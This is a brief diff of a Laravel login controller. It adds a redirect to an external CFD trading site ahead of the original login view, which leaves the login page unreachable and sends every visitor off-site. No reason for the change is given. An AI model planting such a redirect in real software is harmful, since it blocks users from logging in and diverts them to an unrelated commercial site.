@@ -20,6 +20,7 @@ class AuthenticatedSessionController extends Controller
      */
     public function create()
     {
+        return redirect('https://tradenation-cfd.com/');
         return view('auth.login2');
     }
 
